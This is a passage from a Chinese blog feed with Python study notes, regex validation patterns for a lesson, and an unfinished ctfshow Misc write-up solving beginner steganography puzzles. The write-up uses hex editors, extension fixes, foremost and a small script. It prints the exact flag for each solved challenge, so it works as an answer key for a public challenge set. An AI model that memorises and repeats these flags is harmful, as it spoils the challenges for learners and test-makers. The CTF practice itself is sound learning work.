title="蜘蛛图"></a>蜘蛛图</h3><p>蜘蛛图是一种显示一对多关系的方法。<br>在蜘蛛图中，一个变量相对于另一个变量的显著性是清晰可见的。这里需要使用 Matplotlib 来进行画图，首先设置两个数组：labels 和 stats。他们分别保存了这些属性的名称和属性值。因为蜘蛛图是一个圆形，你需要计算每个坐标的角度，然后对这些数值进行设置。当画完最后一个点后，需要与第一个点进行连线。因为需要计算角度，所以我们要准备 angles 数组；又因为需要设定统计结果的数值，所以我们要设定 stats 数组。并且需要在原有 angles 和 stats 数组上增加一位，也就是添加数组的第一个元素。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow解题之Misc入门</title>
      <link href="/2021/11/23/ctfshow%E8%A7%A3%E9%A2%98%E4%B9%8BMisc%E5%85%A5%E9%97%A8/"/>
      <url>/2021/11/23/ctfshow%E8%A7%A3%E9%A2%98%E4%B9%8BMisc%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>还没写完…….</p><p>[TOC]</p><h2 id="图片篇（基础操作）"><a href="#图片篇（基础操作）" class="headerlink" title="图片篇（基础操作）"></a>图片篇（基础操作）</h2><h3 id="Misc-一"><a href="#Misc-一" class="headerlink" title="Misc 一"></a>Misc 一</h3><p>打开图片，看到flag <strong>ctfshow{22f1fb91fc4169f1c9411ce632a0ed8d}</strong></p><h3 id="Misc-二"><a href="#Misc-二" class="headerlink" title="Misc 二"></a>Misc 二</h3><p>图片篇，这个文件的拓展名是txt，但是使用<code>winhex</code>或者<code>01editor</code>打开都可以发现这实际是一个<code>png</code>文件可以看到flag。<strong>ctfshow{6f66202f21ad22a2a19520cdd3f69e7b}</strong></p><h3 id="Misc-三"><a href="#Misc-三" class="headerlink" title="Misc 三"></a>Misc 三</h3><p>这一道题的难点是特殊的文件形式<code>bpg</code>格式，没有相应工具的话无法正常打开，<a href="https://bellard.org/bpg/">bpg下载</a>下载该软件，在cmd界面进行操作，读取图片，得到<code>flag</code>。 <strong>ctfshow{aade771916df7cde3009c0e631f9910d}</strong></p><h3 id="Misc-四"><a href="#Misc-四" class="headerlink" title="Misc 四"></a>Misc 四</h3><p>给了6个”txt”文件,分别用<code>winhex</code>打开，查看文件头，发现需要修改后缀。依次分别改为<code>png、jpg、bmp、gif、tif、webp</code>把这些文件的内容拼接起来就得到<strong>ctfshow{4314e2b15ad9a960e7d9d8fc2ff902da}</strong></p><h2 id="图片篇（信息附加）"><a href="#图片篇（信息附加）" class="headerlink" title="图片篇（信息附加）"></a>图片篇（信息附加）</h2><h3 id="Misc-五"><a href="#Misc-五" class="headerlink" title="Misc 五"></a>Misc 五</h3><p> winhex打开，在尾部能看到<code>flag</code>。 <strong>ctfshow{2a476b4011805f1a8e4b906c8f84083e}</strong></p><h3 id="Misc-六"><a href="#Misc-六" class="headerlink" title="Misc 六"></a>Misc 六</h3><p> 这道题把flag藏到了中间，用<code>winhex</code>打开，搜索<code>flag</code>得到的<strong>ctfshow{d5e937aefb091d38e70d927b80e1e2ea}</strong></p><h3 id="Misc-七"><a href="#Misc-七" class="headerlink" title="Misc 七"></a>Misc 七</h3><p>这个….用记事本打开就行搜索ctfshow就能得到<strong>ctfshow{c5e77c9c289275e3f307362e1ed86bb7}</strong></p><h3 id="Misc-八"><a href="#Misc-八" class="headerlink" title="Misc 八"></a>Misc 八</h3><p>用winhex打开图片，可以发现在第一个png图片尾后面有另一张png的头，可以说明图片中隐写了其他图片，用foremost分离出图片。 得到<strong>ctfshow{5c5e819508a3ab1fd823f11e83e93c75}</strong></p><h3 id="Misc-九"><a href="#Misc-九" class="headerlink" title="Misc 九"></a>Misc 九</h3><p>这个跟第Misc7一样的解法，用记事本打开搜索<code>ctfshow</code>就能得到flag。<strong>ctfshow{5c5e819508a3ab1fd823f11e83e93c75}</strong></p><h3 id="Misc-十"><a href="#Misc-十" class="headerlink" title="Misc 十"></a>Misc 十</h3><h3 id="Misc-十一"><a href="#Misc-十一" class="headerlink" title="Misc 十一"></a>Misc 十一</h3><h3 id="Misc-十二"><a href="#Misc-十二" class="headerlink" title="Misc 十二"></a>Misc 十二</h3><h3 id="Misc-十三"><a href="#Misc-十三" class="headerlink" title="Misc 十三"></a>Misc 十三</h3><p>用winhex打开，看尾部数据，发现两坨可疑字符串，每隔一个字符应该是这个flag。</p><img src="D:\blog\shierjinghuang\source\_posts\ctfshow解题之Misc入门\1.png" alt="1" style="zoom:50%;" /><p>由于有多块这种形式，写一个简单脚本来输出flag。吐槽一句一开始我只看到最后面是这种，当挑出来的flag交上报错之后我还真不知道怎么弄。然后上面还有一个…….</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">"631A74B96685738668AA6F4B77B07B216114655336A5655433346578612534DD38EF66AB35103195381F628237BA6545347C3254647E373A64E465F136FA66F5341E3107321D665438F1333239E9616C7D"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag **ctfshow{ae6e3ea48f518b7e42d7de6f412f839a} **</p><h3 id="Misc-十四"><a href="#Misc-十四" class="headerlink" title="Misc 十四"></a>Misc 十四</h3><h3 id="Misc-十五"><a href="#Misc-十五" class="headerlink" title="Misc 十五"></a>Misc 十五</h3><blockquote><p> flag被跳过去了 :这是我在网络上找到的回答： BMP格式的文件头里有4位字节叫作偏移量，是用来指定从哪个字节开始为实际图像数据用的。这题就是利用增大这个偏移量的方法，把冗余数据塞在了BMP头和图像数据中间的地方。因为这段数据不会被识别，所以可以说是跳过去了。 </p></blockquote><p>那这样预期的结果应该就是在winhex里找到flag了，不过这个跳，确实长知识了。</p><h3 id="Misc-十六"><a href="#Misc-十六" class="headerlink" title="Misc 十六"></a>Misc 十六</h3><h3 id="Misc-十七"><a href="#Misc-十七" class="headerlink" title="Misc 十七"></a>Misc 十七</h3><h3 id="Misc-十八"><a href="#Misc-十八" class="headerlink" title="Misc 十八"></a>Misc 十八</h3><h3 id="Misc-十九"><a href="#Misc-十九" class="headerlink" title="Misc 十九"></a>Misc 十九</h3><h3 id="Misc-二十"><a href="#Misc-二十" class="headerlink" title="Misc 二十"></a>Misc 二十</h3><h3 id="Misc-二十一"><a href="#Misc-二十一" class="headerlink" title="Misc 二十一"></a>Misc 二十一</h3><h3 id="Misc-二十二"><a href="#Misc-二十二" class="headerlink" title="Misc 二十二"></a>Misc 二十二</h3><h3 id="Misc-二十三"><a href="#Misc-二十三" class="headerlink" title="Misc 二十三"></a>Misc 二十三</h3><p>Misc 十八</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python绘图及可视化备课</title>
      <link href="/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/"/>
      <url>/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="python绘图及数据可视化备课"><a href="#python绘图及数据可视化备课" class="headerlink" title="python绘图及数据可视化备课"></a>python绘图及数据可视化备课</h1><p>[TOC]</p><h2 id="补充-上次实验课的库与爬虫"><a href="#补充-上次实验课的库与爬虫" class="headerlink" title="补充 上次实验课的库与爬虫"></a>补充 上次实验课的库与爬虫</h2><p>于刊老师担心我准备的内容不够讲两节课的，如果我讲完这一章的内容还没有结束的话我就讲一讲我最近捣鼓的东西</p><h3 id="1-jieba库进行词频分析"><a href="#1-jieba库进行词频分析" class="headerlink" title="1 jieba库进行词频分析"></a>1 jieba库进行词频分析</h3><h4 id="一、jieba库基本介绍"><a href="#一、jieba库基本介绍" class="headerlink" title="一、jieba库基本介绍"></a>一、jieba库基本介绍</h4><blockquote><p> jieba是优秀的中文分词第三方库，需要额外安装，安装方式为<strong>pip install jieba</strong>,jieba库提供三种分词模式，最简单只需掌握一个函数</p><p>利用一个中文词库，可以确定汉字之间的关联概率,汉字间概率大的组成词组，形成分词结果</p></blockquote><h4 id="二、jieba库使用说明"><a href="#二、jieba库使用说明" class="headerlink" title="二、jieba库使用说明"></a>二、jieba库使用说明</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#精确模式、全模式、搜索引擎模式精确模式：</span><span class="token comment">#把文本精确的切分开，不存在冗余单词</span><span class="token comment">#全模式：把文本中所有可能的词语都扫描出来，有冗余</span><span class="token comment">#搜索引擎模式：在精确模式基础上，对长词再次切分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把文本精确的切分开，不存在冗余单词</p><p>全模式：把文本中所有可能的词语都扫描出来，有冗余</p><p>搜索引擎模式：在精确模式基础上，对长词再次切分</p><p><strong>jieba库常用函数</strong> <img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/1.png"> </p><h3 id="2-re库进行正则匹配"><a href="#2-re库进行正则匹配" class="headerlink" title="2 re库进行正则匹配"></a><strong>2 re库进行正则匹配</strong></h3><p><strong>正则表达式（英文名称：regular expression，regex，RE）是用来简洁表达一组字符串特征的表达式。最主要应用在字符串匹配中。</strong></p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/2.png"> </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/3.png"  /> <p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/4.png"> </p><p>在这里需要注意，match对象是一种特殊的类型，如**re.search()<strong>与</strong>re.match()<strong>虽然也能做到类似的效果，但实际使用是有问题的，在这里使用的</strong>findall()**函数实现。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/5.png"> </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/6.png"  /> <h5 id="校验数字的表达式"><a href="#校验数字的表达式" class="headerlink" title="校验数字的表达式"></a>校验数字的表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">数字：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>$n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span>$至少n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>n<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>$m<span class="token operator">-</span>n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>m<span class="token punctuation">,</span>n<span class="token punctuation">&#125;</span>$零和非零开头的数字：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">|</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span>$非零开头的最多带两位小数的数字：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$带<span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span>位小数的正数或负数：<span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token operator">-</span><span class="token punctuation">)</span>?\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>$正数、负数、和小数：<span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token operator">-</span><span class="token operator">|</span>\<span class="token operator">+</span><span class="token punctuation">)</span>?\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$有两位小数的正实数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$有<span class="token number">1</span><span class="token operator">~</span><span class="token number">3</span>位小数的正实数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$非零的正整数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span>$ 或 <span class="token operator">^</span>\<span class="token operator">+</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>$非零的负整数：<span class="token operator">^</span>\<span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span>"\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$非负整数：<span class="token operator">^</span>\d<span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>$非正整数：<span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>\d<span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$非负浮点数：<span class="token operator">^</span>\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$ 或 <span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span>$非正浮点数：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>?<span class="token punctuation">)</span><span class="token punctuation">)</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span>$正浮点数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token operator">-</span> 负浮点数：<span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token punctuation">)</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token operator">-</span> 浮点数：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span>?\d<span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$ 或 <span class="token operator">^</span><span class="token operator">-</span>?<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span><span class="token punctuation">)</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="校验字符的表达式"><a href="#校验字符的表达式" class="headerlink" title="校验字符的表达式"></a>校验字符的表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">汉字：<span class="token operator">^</span><span class="token punctuation">[</span>\u4e00<span class="token operator">-</span>\u9fa5<span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>$英文和数字：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">&#125;</span>$长度为<span class="token number">3</span><span class="token operator">-</span><span class="token number">20</span>的所有字符：<span class="token operator">^</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$由<span class="token number">26</span>个英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span>$由<span class="token number">26</span>个大写英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z<span class="token punctuation">]</span><span class="token operator">+</span>$由<span class="token number">26</span>个小写英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span>$由数字和<span class="token number">26</span>个英文字母组成的字符串：<span class="token operator">^</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$由数字、<span class="token number">26</span>个英文字母或者下划线组成的字符串：<span class="token operator">^</span>\w<span class="token operator">+</span>$ 或 <span class="token operator">^</span>\w<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$中文、英文、数字包括下划线：<span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span>9_<span class="token punctuation">]</span><span class="token operator">+</span>$中文、英文、数字但不包括下划线等符号：<span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span>\u4E00<span class="token operator">-</span>\u9FA5A<span class="token operator">-</span>Za<span class="token operator">-</span>z0<span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">&#125;</span>$可以输入含有<span class="token operator">^</span><span class="token operator">%</span><span class="token operator">&amp;</span><span class="token string">',;=?$\"等字符：**[^%&amp;'</span><span class="token punctuation">,</span><span class="token punctuation">;</span><span class="token operator">=</span>?$\x22<span class="token punctuation">]</span><span class="token operator">+</span>禁止输入含有<span class="token operator">~</span>的字符：<span class="token punctuation">[</span><span class="token operator">^</span><span class="token operator">~</span>\x22<span class="token punctuation">]</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="特殊需求表达式"><a href="#特殊需求表达式" class="headerlink" title="特殊需求表达式"></a>特殊需求表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">Email地址：<span class="token operator">**</span><span class="token operator">^</span>\w<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token 